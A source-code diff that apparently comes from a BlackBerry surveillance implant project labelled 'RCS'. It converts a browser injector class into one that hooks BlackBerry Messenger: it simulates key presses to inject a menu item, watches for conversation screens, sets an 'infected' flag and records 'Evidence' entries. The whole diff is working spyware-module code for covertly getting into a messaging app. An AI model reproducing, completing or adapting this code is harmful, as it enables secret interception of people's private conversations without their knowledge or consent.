@@ -7,11 +7,10 @@
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
 
-package blackberry.agent.url;
+package blackberry.module.im;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
-import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -21,28 +20,32 @@ import blackberry.injection.KeyInjector;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.Utils;
 
-public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
+/**
+ * Free letters: qwrtyudfgjklzbnm bbm
+ * 
+ * @author zeno
+ * 
+ */
+public class AppInjectorBBM implements AppInjectorInterface, Singleton {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("AppInjBrowser", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE);
     //#endif
 
-    BrowserMenuItem menu = BrowserMenuItem.getInstance();
+    private static AppInjectorBBM instance;
+    private static final long GUID = 0xcb37fa94a62baf5dL;
+    private static final int DELAY = 11000; //11000;
 
-    private static AppInjectorBrowser instance;
-    private static final long GUID = 0xa2b7338e410f087bL;
-    private static final int DELAY = 15000;
-    private static final int MAX_TRIES = 8;
+    private static final int MAX_TRIES = 4;
 
+    private int delay = 100; //500;
     private int tries = 0;
-    private int delay = 400; //500;
-    boolean infected;
 
-    public static synchronized AppInjectorBrowser getInstance() {
+    public static synchronized AppInjectorBBM getInstance() {
         if (instance == null) {
-            instance = (AppInjectorBrowser) RuntimeStore.getRuntimeStore().get(
-                    GUID);
+            instance = (AppInjectorBBM) RuntimeStore.getRuntimeStore()
+                    .get(GUID);
             if (instance == null) {
-                final AppInjectorBrowser singleton = new AppInjectorBrowser();
+                final AppInjectorBBM singleton = new AppInjectorBBM();
 
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
@@ -51,30 +54,32 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         return instance;
     }
 
-    private AppInjectorBrowser() {
+    BBMMenuItem menu = BBMMenuItem.getInstance();
 
+    public boolean requestForeground() {
+        return false;
     }
 
     public boolean injectMenu() {
-        menu.addMenuBrowser();
+        //#ifdef DEBUG
+        debug.trace("injectMenu");
+        //#endif
+        menu.addMenuBBM();
         return true;
     }
 
     public boolean deleteMenu() {
-        menu.removeMenuBrowser();
+        //#ifdef DEBUG
+        debug.trace("deleteMenu");
+        //#endif
+        menu.removeMenuBBM();
         return true;
     }
 
     public boolean callMenuByKey() {
-
-        Screen screen = UiApplication.getUiApplication().getActiveScreen();
-
         //#ifdef DEBUG
-        debug.info("calling browser menu: " + screen);
-        if (screen != null) {
-            debug.trace("application: " + screen.getApplication());
-            debug.trace("menu: " + screen.getMenu(0));
-        }
+        debug.info("calling bbm menu: "
+                + UiApplication.getUiApplication().getActiveScreen());
         //#endif
 
         tries++;
@@ -83,23 +88,11 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
             debug.error("callMenuByKey: too many tries");
             //#endif
             if (tries == MAX_TRIES) {
-                Evidence.info("NO URL");
+                Evidence.info("NO BBM");
             }
             return false;
         }
 
-        //#ifdef DEBUG
-        //Backlight.enable(true);
-        //#endif
-        /*
-         * if (tries % 2 == 0) { //#ifdef DEBUG
-         * debug.trace("callMenuByKey press escape key, try: " + tries);
-         * //#endif KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-         * //KeyInjector.trackBallRawClick(); }
-         */
-
-        Utils.sleep(delay + tries * 20);
-        
         //#ifdef DEBUG
         debug.trace("callMenuByKey press menu key, try: " + tries);
         //#endif
@@ -107,39 +100,41 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         Utils.sleep(delay + tries * 20);
 
         //#ifdef DEBUG
-        debug.trace("callMenuByKey: pressRawKey");
+        debug.trace("callMenuByKey: pressRawKey, time=" + delay + tries * 20);
         //#endif
         KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
 
         Utils.sleep(delay + tries * 20);
+        //KeyInjector.trackBallRawClick();
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        
-        menu.firstTime();
 
-        if (screen != null) {
-            screen.close();
-        }
         return true;
     }
 
     public String getAppName() {
-        return "Browser";
+        return "Messenger";
     }
 
     public void callMenuInContext() {
-        menu.callMenuInContext();
+        //#ifdef DEBUG
+        debug.trace("callMenuInContext");
+        //#endif
+        BBMMenuItem.getInstance().checkForConversationScreen();
 
     }
 
+    boolean infected;
+
     public boolean isInfected() {
+
         return infected;
     }
 
     public void setInfected(boolean value) {
         if (value) {
-            Evidence.info("URL: " + tries);
+            Evidence.info("BBM: " + tries);
         }
-        infected = true;
+        infected = value;
     }
 
     public int getDelay() {
@@ -148,6 +143,9 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     }
 
     public void reset() {
+        //#ifdef DEBUG
+        debug.trace("reset");
+        //#endif
         tries = 0;
     }
 
